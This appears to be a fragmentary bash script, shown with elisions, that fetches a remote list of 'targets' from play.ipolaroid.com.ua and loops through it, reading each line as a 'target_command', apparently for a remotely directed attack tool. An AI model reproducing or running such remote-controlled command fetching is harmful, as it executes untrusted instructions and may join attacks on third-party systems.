...
do
  ...
  number_of_targets=$(curl -s http://play.ipolaroid.com.ua/target.txt | cat | grep -c "^[^#]")
  ...
  do
    target_command=$(awk 'NR=='"$i" <<< "$(curl -s http://play.ipolaroid.com.ua/target.txt | cat | grep "^[^#]")")
